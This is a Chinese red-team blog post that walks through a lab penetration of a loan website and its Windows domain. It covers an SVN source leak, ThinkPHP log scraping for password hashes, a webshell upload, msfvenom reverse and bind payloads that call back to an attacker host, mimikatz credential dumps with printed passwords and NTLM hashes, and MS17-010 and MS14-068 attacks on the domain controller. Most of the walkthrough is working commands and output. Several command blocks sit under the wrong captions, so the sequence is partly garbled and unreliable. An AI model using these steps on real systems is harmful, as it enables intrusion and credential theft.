\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/bYd\_PT3J\_NIZ6AaSCI3Ixg)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **30** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

环境

DC 域控：10.10.10.149

WEB：192.168.2.27（外网）、10.10.10.150（内网）

Kali：192.168.2.28

本文知识点：

svn 源码泄露  

thinkphp3 日志泄露  

贷款后台 getshell

msf 下的内网渗透

ms16-048 提权到域控  

黄金票据

**主机发现**

**信息搜集**

首先使用 nbtscan 对内网进行扫描，发现靶机 ip 为 192.168.2.27:  

```
nbtscan -r 192.168.2.4/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaOFHsAdDTmZQodYyz1y6Pzkos19JvtjARNRC1UAlib1yTvcf7fMyriaoA/640?wx_fmt=png)

之后对靶机进行端口扫描：

```
nmap -A 1-65535 -sV 192.168.2.27
```

```
dirb http://192.168.2.27/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaTeia6JULNplicxW1E7OLudgibWmwkxjFvrVict4X31caOXD2Tu8Elc9Hfw/640?wx_fmt=png)

由上图可知，目标开放了 80 端口，其中用的是 phpstudy 搭建的网站，用 ip 打开发现是一个 403:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaHp19nCuuicqEB5kzCjaNvjwBG04O51kVz5NOdEicSWXplOyIibCgrrl7A/640?wx_fmt=png)

那么对其扫描目录看看有没有敏感文件：

```
dirb http://www.webhack123.com
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiapJtWwicoCRtdBLbiaiaZC2VAQv8Y8ul1wicwvqfTvz97zHBicJeD5MZdvjw/640?wx_fmt=png)

并没有扫描到可利用的文件，估计是字典问题。

由于上面扫描结果发现目标有一个域名：webhack123.com，我们访问其看发现是一个贷款网站：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia9Z6tS94Stn95cAL3ph2QVmw5AnsHmMTrfI8bhL8EJJ1Esxuv0WnwZw/640?wx_fmt=png)

使用 whatweb 查看网站信息：发现是 ThinkPHP 框架：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaiawXOQtpgfibNw8kgJlgF8FoeloWDUsYKQhdFefiaDjf4EI93ORemHaWw/640?wx_fmt=png)

之后继续进行目录扫描：  

```
python SvnExploit.py -u http://www.webhack123.com/.svn
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiavfRPTywUWHHQZWDbdIFrp2Sus17dRUb1GfAoW8ziakpic45FtVc2gIbA/640?wx_fmt=png)

发现一个 svn 目录，有可能是 svn 文件泄露！

* * *

**svn 文件泄露漏洞**

之后使用 github 上的利用工具进行利用：https://github.com/admintony/svnExploit  

```
python SvnExploit.py -u http://www.webhack123.com/.svn --dump
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiabzEU3r2mNvFdsib73zZtfecEo9MgvGxJnebh8iaBN9gHvDrulWHrnkMQ/640?wx_fmt=png)

下载目标源码：

```
sqlitebrowser wc.db
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiawdffdTxmuic3GLaQ1yCIaIX7TyDLdwTamgzV6SI4gP9S12FwZiaicgGAw/640?wx_fmt=png)

其中发现一个 wc.db 数据库文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaHSGFU0QhfCtAOVibAmOAxTCykxkEQcaPIgQEGlicQfbaWUdkTNtAVwQQ/640?wx_fmt=png)

那么我们就可以打开这个文件查看数据库：里面有网站文件

```
THINKPHP3.2 结构：Application\\Runtime\\Logs\\Home\\16\_09\_09.log
THINKPHP3.1结构：Runtime\\Logs\\Home\\16\_09\_09.log
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia6L3dxibKRurLFU3bExfpTl6MCeJeMobgPJu3wvx16FVPDGibcvH8oQRA/640?wx_fmt=png)

看着目录结构应该是`tp`低版本的，反正不可能是`tp5`:

其中发现有很多日志文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia8YuP6hP4Yhz23HXQtrh8Vl9Q7AVl8mzttKV12C17GRmMhAg05icqVWA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaRFDyoopfGDzSqicGWkS7PWSPtra9y6tMhVcwPtB2gkxcAnuphfQUsRg/640?wx_fmt=png)

* * *

**thinkphp3.2 日志泄露漏洞**

由于是 tp 低版本的，我在网上找到了一个日志泄露漏洞：https://blog.csdn.net/Fly\_hps/article/details/84994290

发现当前的 tp 版本是：tp3.2

```
admin            10470c3b4b1fed12c3baac014be15fac67c6e815
18888888888      10470c3b4b1fed12c3baac014be15fac67c6e815
```

由于这个版本的 thinkphp 的错误日志里会显示出数据库的 sql 执行信息，而我们要找的是数据库密码、网站后台登陆密码，这样才能对我们有利用价值，而且我们看日志只需要看最新的日志，因为考虑到目标可能更改了密码，而最新的密码是不会更改的！

其中最新的日志是 App/Runtime/Logs/19\_03\_18.log：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiahSx91hAFzxNxZIzEITHlwL2H05LibLFzBw5m9ib4vIt2GkSEcxTxEakQ/640?wx_fmt=png)

通过 crlt+f 快速锁定 password，得到一些账号和密码哈希值：  

```
python IP\_hosts\_scan\_multithreading.py
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaacQJqGiaAFYggXdJyO71XCEG80H3fyHZwsEQKdQbnGYpDJ5cCWhRUVg/640?wx_fmt=png)

解密之后得到明文为：123456

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiajawxHPiaNwoMkX8DrbLicL5EHtLwAN0aDoKQG3CWyCJ6nzAeMbNLMhjg/640?wx_fmt=png)

既然拿到管理员后台账号密码了，我们就去找后台地址吧！

* * *

**后台查找**

一般来说我们找网站后台无非几种方法：

*   目录查找：一般的目录是 /admin，/login ...
    
*   子域名查找：admin.saulgoodman.cn，user.saulgoodman.cn ...
    
*   Host 碰撞子域名：这种不常见，渗透过程中需要绑定 hosts 才能访问的弱主机或内部系统（适用于靶场、CTF）
    

因为之前我们对他进行目录扫描了，没有找到后台地址，那么还有子域名和 Host 碰撞子域名。

而子域名的话由于是靶场，一般来说没得，只能通过 ip 碰撞的形式，就是下面的方法。

所以我们采用第三种方式：ip-host 碰撞查找子域名

Host\_Ip 碰撞工具：https://github.com/fofapro/Hosts\_scan

host.txt 里填写的是要碰撞的子域名：webhack123.com，admin... 可以自行添加字典！

ip.txt 里填写的是目标的 ip：192.168.2.27

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiar6jblnYsMmpZBNdBOhLu9ricPkCShvosLprsCzsc7X7GhfzlniaN4LMw/640?wx_fmt=png)

```
vi /etc/hosts
```

运行完后，能访问到的子域名会在本地的 host\_ok.txt 保存：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaWnqwCdSLZygHI22mWNZErLGHX08pxmN3VYx9gnfg1pVcS7A31SkN9Q/640?wx_fmt=png)

可以看到上图，只有 admin.webhack123.com 的子域名是 200 状态码，那么我们修改一下我们的 hosts 文件才可以访问：

```
#coding:utf-8
import requests
url ="http://www.webhack123.com/App/Runtime/Logs"
def add\_urls(patch,y):
    urls=\[\]
    for i in range(1,7):
        for j in range(1,32):
            if i<10:
                if j<10:
                    urls.append(patch+"/%s\_0%s\_0%s.log" %(y,i,j))
                else:
                    urls.append(patch+"/%s\_0%s\_%s.log" %(y,i,j))
            else:
                if j<10:
                    urls.append(patch+"/%s\_%s\_0%s.log" %(y,i,j))
                else:
                    urls.append(patch+"/%s\_%s\_%s.log" %(y,i,j))
    return urls


urls = add\_urls(url,"20")

for i in urls:
    req=requests.get(i)
    if req.status\_code==200:
        print(i)
        html = req.text
        with open("webhack123.txt",'a',encoding='utf-8') as f:
            f.write(html)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia29rPXKGwqbIfC3UicZIHNTWjblPPicxqGHFCLiaXHXVEuY9BVLAwXaYRA/640?wx_fmt=png)

这个时候就能访问：admin.webhack123.com

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaia1XiaAiaA6Q07M1Kjfic1bADuMm9KNbs74ON3QRKDxLSGQfVvhib5nnBVw/640?wx_fmt=png)

这个时候通过之前拿到的后台密码发现登陆失败：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaibucUGaS7ic8icmIVe5ErG6RJ7IEXbW74b4Yuy05viatG5DFgibmWonlicfA/640?wx_fmt=png)

有两种情况：

*   目标密码根本不是我们之前获取到的密码
    
*   日志不是 2020 年的导致我们获取到的密码不对
    

回炉再造之峰回路转重新查找目标日志，由于之前我找到的是 19 年的日志，密码不对，因此我们写一个 python 脚本来锁定 20 年的日志：

```
python3 tp.py
```

之后使用 python3 运行脚本：

```
tasklist /v
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaaHmo3QuYpeicUialKcaQk2atB7miaw3qhajM0SuBbuwRslW2siaqIkd90A/640?wx_fmt=png)

通过锁定 sql 日志最后一次的 password 记录，发现哈希为：74c774ef39b5b977c1fd59dbfc73c3e380a65aa3

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia5ONiaKFNFicTMxfoTiaKLaJNZxQdje3tibzjLib80WHOaIL1vqYt2vqS1wg/640?wx_fmt=png)

解密发现密码为：web123

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaxZnib9Vt7EicDjRAu1kWj5tKCRUKugialp1DQeOz4U9hYGdBb2H6APHng/640?wx_fmt=png)

这个时候就使用账号密码：admin、web123 登陆成功！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia6jzzIia1YhalhWUbmdIAeibFGA2HTqeRrQeRibwaITW2ech220zRnV2ew/640?wx_fmt=png)

* * *

**贷款网站后台 getshell**

进入后台后我发现一个可以修改上传后缀的点，直接修改 php 为允许上传：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiau3jnl9GEYKIIQI3QbFcx4qsS1kVE24lg8hBDkSDI7YMicgHddKmKMPA/640?wx_fmt=png)

之后通过网站 logo 处上传 php 大马成功 getshell：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiae5t8y5LCmMiaNQfOrHHabNiarmzA8Gws5TrsRfeDJdDSgIoQSJjdoUKA/640?wx_fmt=png)

木马地址：http://admin.webhack123.com/Public/Upload/20201115/7258eb2e86878d1ea633865934c6a2ba.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaMa3avMEicYIAHbwETFg6NyzIvA7DJcJNIZiakO2Zcd2ALmtId4SnDITA/640?wx_fmt=png)

* * *

**Metasploit 进行内网渗透**

既然拿到 shell 了，我们通过查看 whoami 发现我们是一个管理员权限：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaHIoL6vMOFgWBQVfloNuicvbicFc9icvF1IbxVBGnstP1d0pzKKZaFzLvQ/640?wx_fmt=png)

不管了，先用 cobaltstrike 让目标上线吧，上线之前先看看目标机器上有没有 AV，有的话我们还需要做一下免杀：

```
msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.2.28 lport=5555 -f exe>5555.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaLwgsMkQ2nQ75nYsIBkF0Lib2VxbkNMlFZneLCwydJPzSA4x01UACCwg/640?wx_fmt=png)

查看进程发现没有 AV，这个时候就可以直接用 MSF 反弹一个 shell：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse\_tcp
set lhost 192.168.2.28
set lport 5555
run
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaYHmrH1aUTLcdcWSHCZ2kuJl779bnia6S9PaD4cWffUGnKb9NEG98gQg/640?wx_fmt=png)

之后设置 MSF 监听，然后运行木马上线：

```
\#  加载mimikatz模块
load mimikatz
# 抓取密码
wdigest
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiatiaicUJBic5b3Zxz5iasKiaX2HgZJwb89MZVjVficwJict8LEibiaWsboYiaqG1Q/640?wx_fmt=png)

之后使用 MSF 自带的模块进行进程迁移到 system 的进程：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia1049fKuYq1RH0HfWWRjicJXRib2EEaibgLYT6HYz5UCic1sJ0TOxa3yUkg/640?wx_fmt=png)

这个时候尝试抓目标系统上的密码，我使用的是 MSF 自带的 mimikatz 模块：

```
meterpreter > wdigest 
\[+\] Running as SYSTEM
\[\*\] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;47706   NTLM                                    
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
0;423161  NTLM       WEB           Administrator  !@#Qwe456
0;996     Negotiate  HACKBOX       WEB$           fd 98 a6 6e 20 e3 7b c1 4d 89 89 44 ac 7d 5e eb e5 e4 05 66 32 4d 9d 18 4e 8d 20 b1 ee 19 31 27 88 ec 81 a4 c1 d7 09 81 8d 49 e2 53 28 fd 98 5b 0a 84 49 b2 12 8c fd e1 f3 be 44 d4 f6 fc 20 54 b4 2b 85 6a 04 6f 5b d4 30 3d 03 b8 bc 84 9e c0 0c 3a 0f fa 9d 13 22 df 80 23 67 72 04 5e be 7c a7 f7 84 f1 eb 3f 5e 0f 85 23 7f 20 24 89 fe 2f 73 08 ee b6 e7 50 f7 e2 d5 19 4b 36 2b 73 90 da d1 c3 e7 a7 c4 32 e6 1b d4 7c e2 de 46 35 2d ff f7 d0 53 0d 38 76 4a a7 98 7b 95 a4 1e 72 7c ad b3 d6 fc 81 f0 af 7f 43 e7 38 58 fc 5b a1 2a 67 65 aa 09 f2 ff 2d 46 a6 6b 51 1a 25 58 77 d1 bc 75 6c 12 94 10 34 57 b7 5b 02 e6 cb 1c 7b e4 a1 ee cf 91 0c 7c 81 53 74 5e e4 8e 5f 11 be 72 e0 77 42 c3 73 08 af d2 fe 17 18 4a 29 24 bd 4a 86
0;999     Negotiate  HACKBOX       WEB$           fd 98 a6 6e 20 e3 7b c1 4d 89 89 44 ac 7d 5e eb e5 e4 05 66 32 4d 9d 18 4e 8d 20 b1 ee 19 31 27 88 ec 81 a4 c1 d7 09 81 8d 49 e2 53 28 fd 98 5b 0a 84 49 b2 12 8c fd e1 f3 be 44 d4 f6 fc 20 54 b4 2b 85 6a 04 6f 5b d4 30 3d 03 b8 bc 84 9e c0 0c 3a 0f fa 9d 13 22 df 80 23 67 72 04 5e be 7c a7 f7 84 f1 eb 3f 5e 0f 85 23 7f 20 24 89 fe 2f 73 08 ee b6 e7 50 f7 e2 d5 19 4b 36 2b 73 90 da d1 c3 e7 a7 c4 32 e6 1b d4 7c e2 de 46 35 2d ff f7 d0 53 0d 38 76 4a a7 98 7b 95 a4 1e 72 7c ad b3 d6 fc 81 f0 af 7f 43 e7 38 58 fc 5b a1 2a 67 65 aa 09 f2 ff 2d 46 a6 6b 51 1a 25 58 77 d1 bc 75 6c 12 94 10 34 57 b7 5b 02 e6 cb 1c 7b e4 a1 ee cf 91 0c 7c 81 53 74 5e e4 8e 5f 11 be 72 e0 77 42 c3 73 08 af d2 fe 17 18 4a 29 24 bd 4a 86

meterpreter > msv
\[+\] Running as SYSTEM
\[\*\] Retrieving msv credentials
msv credentials
===============

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;996     Negotiate  HACKBOX       WEB$           lm{ 00000000000000000000000000000000 }, ntlm{ 9c85552a37071a3d5cb1323478044b0d }
0;47706   NTLM                                    lm{ 00000000000000000000000000000000 }, ntlm{ 9c85552a37071a3d5cb1323478044b0d }
0;423161  NTLM       WEB           Administrator  lm{ c6125126643bbe191e929ffc01395127 }, ntlm{ 086a0bb1ed4ec72250760ea531bf8074 }
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
0;999     Negotiate  HACKBOX       WEB$           n.s. (Credentials KO
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia1nGYexERNF3pnFibG8vWS3icvuic7iaKM7m55MIuJa58vsXu5Ux9IusflA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaT04PTTwoUHgSTlFq5CukibPlRlvWicUeFo5PgZHDNDMsN9pAnK0kLxpA/640?wx_fmt=png)

 抓到了 administrator 的密码为：!@#Qwe456，而且目标看上去是一个域环境。

```
\# 查看是不是域环境
run post/windows/gather/enum\_domain
```

为了验证一下我们查看一下目标：ipconfig /all，发现目标是存在域环境的，主机名是：web，域是：hackbox.com，并且目标是有双网卡，有一个内网网卡，内网 ip 为：10.10.10.150，其中 dns 服务器是：10.10.10.149

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaPpLbZW1eQiaJvXmN19dHH5ZqK5u64fia86VPd2YXyOvtlsLT4uK0EeWw/640?wx_fmt=png)

一般情况下，域控制器的 ip 地址就是 dns 服务器 ip，10.10.10.149 这个 ip 有可能是域控制器的 ip！

如果不是的话，我们还可以通过 MSF 的模块来搜集域内信息：

```
run autoroute -s 10.10.10.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPianprgiaibHbseiau1lOdLMTShxliafjUVynDI8Qy5wTicPEtjibLEgM0W5xjw/640?wx_fmt=png)

当前的域是：hackbox，dc（域控制器）的 ip 为 69.172.201.153，这个 ip 是一个外网 ip，由于是靶机的情况下，他找不到内网 ip，就只能找外网的了，我们不用管。

通过域内信息搜集，发现 hackbox 域内只有两个主机：dc、web，而 web 是当前我们拿到权限的的主机：10.10.10.150，而 dc 应该就是：10.10.10.149:net view /domain:hackbox

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaRu7UllDcQzJTGicxPwuabQicQrCv7bTWU6AR4bvUGVib3zwz5EmuwqgicA/640?wx_fmt=png)

这个时候 ping 一下 dc 就直接确定了 dc 的 ip 为：10.10.10.149：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaWLFY1pkYfhwicaIeH93PTaYiccazqibf3pdpDBnIuK2IQZdSAZOzRFY6g/640?wx_fmt=png)

之后我们需要做域内渗透，由于我们 kali 不能直接访问目标的内网，那么我们就需要做一层路由代理，才能对目标内网进行渗透！

添加路由：

```
use auxiliary/server/socks4a
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaQPia28GRtmR57xqZjENllvicNlRQtQUgpoG8b0AWgSO9HLFaS6b9aZaQ/640?wx_fmt=png)

然后进行 socks 代理：

```
vi /etc/proxychains.conf
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaicLGCJeAhYmb6AT0ru8r75dgJHFSo8xznibIsMweDbNxDMB9trHId7rA/640?wx_fmt=png)

再设置 proxychains：

```
proxychains nmap -sT -Pn 10.10.10.149
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaL7KtjgfwwxxhIxS9F8ic6iaTlVKzjJUFZI5lF8UHqETnUrno4373ncibA/640?wx_fmt=png)

这样就能对它内网进行渗透了，在使用工具的时候，命令前面加一个：proxychains

PS：proxychains 不支持 udp 和 icmp 协议，因此我们需要对目标进行 tcp 扫描！

对域控进行端口扫描：

```
auxiliary/scanner/smb/smb\_ms17\_010
set rhosts 10.10.10.149
run
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaJZlAjFLD8ONewPTzoiaLRcBetcjVBEnjYYqShYerrGUsicQtIGFbJ4kg/640?wx_fmt=png)

发现目标开启了 445 端口，看看有没有 ms17010：

```
use exploit/windows/smb/ms17\_010\_eternalblue
set rhosts 10.10.10.149
set payload windows/meterpreter/bind\_tcp
exploit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaNpLdmgdddEhlSmuvvS7BeYib9TJFjfh81RwuTaVxl3sps4eYvFo6ib1w/640?wx_fmt=png)

发现目标存在永恒之蓝！

随其进行 ms17010 漏洞利用：（由于目标是内网，不能出网，我们只能设置正向的 payload，类似于 cs 的中转上线）

```
.\\administrator
!@#Qwe456
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaSAfItGEqgxTwLSZnicib0MTEibl3XBrAmOFpVLftL1MG7ZLicbCcK6Kgicw/640?wx_fmt=png)

但是利用失败了：（ms17017 有的时候就有点玄学）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaD5t3ng5DyS6nEj7Iqj2roRDIy4xZicAN5Ug2q0jtZheUr3kzPxj1rDA/640?wx_fmt=png)

这个时候我们可以尝试 kerberos 域用户提取的漏洞：ms14-068，他能够将域内任意用户提取到域管理员！

关于这个漏洞大家可以去我公众号：渗透攻击红队查看相关文章，我之前有写过！

* * *

**Ms14-068 提权到域控**

由于之前我们获取到了 web 的密码为：!@#Qwe456，然后尝试进行远程桌面登陆域用户：发现登陆失败，域用户 web 应该是没有远程桌面的权限的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPialhKAH4Kjvme87LHgiceIXJ0zAiawu0BoCibVsxH9JxIicekyNtw6AzibYwA/640?wx_fmt=png)

但是我们可以通过登陆它的工作组：  

```
upload /root/ms14-068.exe C:/phpstudy\_pro/WWW/www.webhack123.com/ms14-068.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiamJfTarQ6eFZhrVJlRicttNhSoib4KjhmdrF7IHcDAicJkG0Hov4lmEib8w/640?wx_fmt=png)

那么我们之间吧 ms14-068.exe 上传到目标 web 的主机上：

```
cd C:\\phpstudy\_pro\\WWW\\www.webhack123.com\\
chcp 65001  #  设置一下字符编码
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaoKTheCQ9av9EKXwjPkqibeaav7cUONs75Wkdc1DaEQL7FLubuKicxRpw/640?wx_fmt=png)

然后切换到 ms14-068.exe 那个文件的目录下：

```
run post/windows/gather/enum\_logged\_on\_users
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiasuDH3b74fp90w6WnZdicWl21xksIKic8gLG7fjQtlyJLawFPRYtgJoag/640?wx_fmt=png)

由于使用 ms14-068 需要一个域用户的账号密码，和域用户的 sid，以及域控的 ip，而我们没有 sid，那么我们需要使用 msf 查看域用户 web 的 sid：

```
Recently Logged Users
=====================

 SID                                            Profile Path
 ---                                            ------------
 S-1-5-18                                       %systemroot%\\system32\\config\\systemprofile
 S-1-5-19                                       C:\\Windows\\ServiceProfiles\\LocalService
 S-1-5-20                                       C:\\Windows\\ServiceProfiles\\NetworkService
 S-1-5-21-1443003717-4130318662-4279967973-500  C:\\Users\\Administrator
 S-1-5-21-2005268815-658469957-1189185684-1103  C:\\Users\\web
 S-1-5-21-2005268815-658469957-1189185684-500   C:\\Users\\Administrator.HACKBOX
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPialwRPSQd6OGJGAcB6Me2nw2tzxjypylBcLuJniaCIwibVkdjlh91UGMicA/640?wx_fmt=png)

```
user：hackbox\\web
pass:!@#Qwe456
sid:S-1-5-21-2005268815-658469957-1189185684-1103
命令如下：
ms14-068.exe -u web@hackbox.com -p !@#Qwe456 -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149
```

之后就可以使用 ms14-068 进行攻击了：

```
upload /root/mimikatz.exe C:/phpstudy\_pro/WWW/www.webhack123.com/
upload /root/mimidrv.sys C:/phpstudy\_pro/WWW/www.webhack123.com/
upload /root/mimilib.dll C:/phpstudy\_pro/WWW/www.webhack123.com/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaCxaBaib9CTUSdxkZ4oCSB1LibgQQbqm8Qrf7icrd6o9JPcSKwUSGzRibCQ/640?wx_fmt=png)

生成的票据为：TGT\_web@hackbox.com.ccache。

之后就可以使用 mimikatz 进行攻击了，由于 msf 下的 mimikatz 是阉割版，功能只有几个：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiacibwYwabLsLZdiauaIuGicdcdZO0yh8f3oC9bS3CqFof1ydhplP60cwHQ/640?wx_fmt=png)

所以我们需要上传一个 mimikatz 到目标机器上进行攻击：

```
mimikatz.exe
# 清楚目标内存中的所有票据
kerberos::purge
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaP6MZswXaBibV6f9iaubYrwkOqMOIMHqDqkw0riaGicMoWgN9NVIWH7JoSw/640?wx_fmt=png)

之后进入到 mimikatz 的目录进行攻击：

```
\# 将票据注入到目标内存
kerberos::ptc TGT\_web@hackbox.com.ccache
# 查看当前票据
kerberos::list
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiazTrvYicjM6OYPnQBIusSvc8oSvmkz7eiaKwF2ic5vqjDNtqfIKPqjvM2Q/640?wx_fmt=png)

```
dir \\\\dc\\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaFiccVaCNW4DLEqkCib3ry5Bcibw3q9hvDDC5xb3jWUVHbreYL7uWZ1F6Q/640?wx_fmt=png)

PS：这个票据只能用 7 天，之后就不能使用了！

这个时候，我们就可以通过 dir 命令查看到目标域控的文件了：

```
msfvenom -p windows/meterpreter/bind\_tcp lport=10000 -f exe >10000.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaic2RxOicVXlxbZeficNOKL6Piah9RibSPJAvnXXQ49wPeIINEgq5g0OviaQA/640?wx_fmt=png)

最后可以使用定时任务让目标 dc 上线到 msf，而我们要生成一个木马让目标上线，注意这里生成的木马需要是正向的，不然目标上线不了：

```
upload /root/10000.exe C:/phpstudy\_pro/WWW/www.webhack123.com/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaPLEyickRrGv9XP5TxH1msukdKg5xQEsDWqq9XqIKBibdpJNgBXMS9obA/640?wx_fmt=png)

然后吧 10000.exe 先上传到 web 主机上，之后再上传到目标 dc 机器上：

```
copy 10000.exe \\\\dc\\c$\\10000.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaoht2yAtRYgE7mPMUbCK61Uje3TKg3ORm8K7ialxkf6axiaR6DE2fEq9A/640?wx_fmt=png)

